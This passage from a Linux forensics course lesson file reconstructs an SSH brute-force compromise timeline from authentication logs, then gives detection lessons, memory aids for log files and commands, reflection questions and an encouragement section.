publickey for svc-db from 45.123.67.89 port 54321 ssh2: RSA SHA256:xyz789...\n```\n\nAttacker returned using SSH key (persistence mechanism working).\n\n## Timeline Reconstruction\n\n```\n┌────────────────────────────────────────────────────────────────┐\n│ Oct 14, 03:45-03:47  │ Brute force attack (127 attempts)      │\n├────────────────────────────────────────────────────────────────┤\n│ Oct 14, 03:47        │ Successful login (weak password)       │\n├────────────────────────────────────────────────────────────────┤\n│ Oct 14, 03:48        │ Privilege escalation (sudo to root)    │\n├────────────────────────────────────────────────────────────────┤\n│ Oct 14, 03:49        │ Add malicious cron job (C2 channel)    │\n├────────────────────────────────────────────────────────────────┤\n│ Oct 14, 03:50        │ Add SSH key (secondary persistence)    │\n├────────────────────────────────────────────────────────────────┤\n│ Oct 14, 03:52        │ Initial session ends (cleanup)         │\n├────────────────────────────────────────────────────────────────┤\n│ Oct 14-15 (ongoing)  │ Cron job runs every 10 min (exfil)     │\n├────────────────────────────────────────────────────────────────┤\n│ Oct 15, 16:30        │ Attacker returns via SSH key           │\n└────────────────────────────────────────────────────────────────┘\n```\n\n**Total time from initial access to persistent compromise: 5 minutes**\n\n## Lessons Learned\n\n✅ Service accounts should:\n- Have strong passwords (or no password - key-only)\n- Never have sudo privileges\n- Use /usr/sbin/nologin shell\n- Be monitored for any interactive login\n\n✅ Detection opportunities:\n- Alert on failed login spikes\n- Alert on service account interactive logins\n- Monitor authorized_keys modifications\n- Review crontab changes\n- Log all sudo usage\n\n✅ Authentication logs provided:\n- Initial access vector (brute force)\n- Privilege escalation timeline\n- Persistence mechanism identification\n- Attribution (source IP)\n- Complete attacker activity timeline"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# Memory Aids: Authentication Logs\n\n## Key Files (Remember: \"AWBL-US\")\n\n**A**uth.log / Secure - Authentication events\n**W**tmp - Successful logins (Who logged in?)\n**B**tmp - Failed logins (Bad login attempts)\n**L**astlog - Last login per user\n**U**tmp - Currently logged (Users now)\n**S**yslog/journalctl - System-wide logs\n\n## Log File Locations (Remember: \"Debian = A, Red Hat = S\")\n\n**Debian/Ubuntu** = **/var/log/auth.log** (\"A\" for Auth)\n**RHEL/CentOS** = **/var/log/secure** (\"S\" for Secure)\n\n## Reading Binary Files (Remember: \"Last Commands\")\n\n**last** = wtmp (successful logins)\n**lastb** = btmp (bad/failed logins)\n**lastlog** = lastlog (last login per user)\n**who** = utmp (who is logged in now)\n**w** = utmp + activity (what are they doing?)\n\n## SSH Authentication Types\n\n**\"Accepted password\"** = Password auth\n**\"Accepted publickey\"** = SSH key auth\n**\"Failed password\"** = Wrong password\n\n## Sudo Log Format (Remember: \"TWP-UC\")\n\n**T**TY = Terminal\n**W**orking Directory (PWD)\n**U**ser (target user)\n**C**ommand executed"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection Questions\n\n1. **Why are authentication logs more reliable than command history for forensics?**\n\n2. **You find 500 failed login attempts for 'root' from IP 45.123.67.89, but no successful login. Is this still concerning? What should you investigate?**\n\n3. **A service account shows \"Never logged in\" in lastlog, but you see \"Accepted password\" in auth.log. What does this indicate?**\n\n4. **How would you detect if an attacker added their SSH key to a user's authorized_keys file?**\n\n5. **Compare the forensic value of password authentication vs. public key authentication logs.**"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "## Congratulations! 🎉\n\nYou've mastered authentication log forensics - one of the most powerful investigation techniques!\n\n**What you can now do**:\n✅ Detect brute force attacks instantly\n✅ Track user sessions from login to logout\n✅ Analyze SSH key-based persistence\n✅ Reconstruct attacker timelines from logs\n✅ Monitor authentication in real-time\n\n**Real-world impact**: These skills solve 70%+ of Linux breach investigations.\n\n**Next**: Lesson 77 will teach you system-wide logging architecture (syslog, rsyslog, journald) - completing your forensic toolkit!\n\nKeep going - you're building expertise that companies desperately need! 🚀"
      }
    }
  ],
  "tags": [
    "Course: 13Cubed-Investigating Linux Devices"
  ]
}